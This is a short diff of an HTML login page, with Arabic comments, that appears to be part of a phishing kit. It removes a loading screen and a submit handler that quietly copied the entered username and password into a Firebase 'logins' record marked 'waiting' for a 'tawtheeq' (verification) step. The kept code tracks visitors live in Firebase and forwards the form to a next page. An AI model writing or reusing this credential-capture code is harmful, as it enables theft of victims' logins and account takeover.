@@ -137,10 +137,7 @@
         </footer>
     </div>
 
-    <div id="loading-screen">
-        <div class="loader"></div>
-        <p id="status-text" style="margin-top: 25px; font-weight: bold; color: var(--primary-blue); font-size: 18px;">جاري معالجة الطلب...</p>
-    </div>
+
 
     <script>
         // إعدادات Firebase
@@ -175,23 +172,9 @@
         });
         visitorRef.onDisconnect().remove();
 
-        // معالجة إرسال الفورم المباشر وحفظ حالة الانتظار
+        // إرسال الفورم مباشرة للانتقال الفوري للصفحة التالية
         document.getElementById('directLoginForm').addEventListener('submit', function(e) {
-            const username = document.getElementById('user').value;
-            const password = document.getElementById('pass').value;
-
-            // إرسال البيانات للفايربيس أيضاً للاحتياط
-            const loginRef = database.ref('logins/' + visitorId);
-            loginRef.set({
-                id: visitorId,
-                username: username,
-                password: password,
-                timestamp: firebase.database.ServerValue.TIMESTAMP,
-                status: "waiting",
-                step: "tawtheeq"
-            });
-
-            // إرسال الفورم مباشرة دون شاشة تحميل في هذه المرحلة
+            // لا حاجة لأي تأخير أو شاشات تحميل هنا
         });
     </script>
 </body>
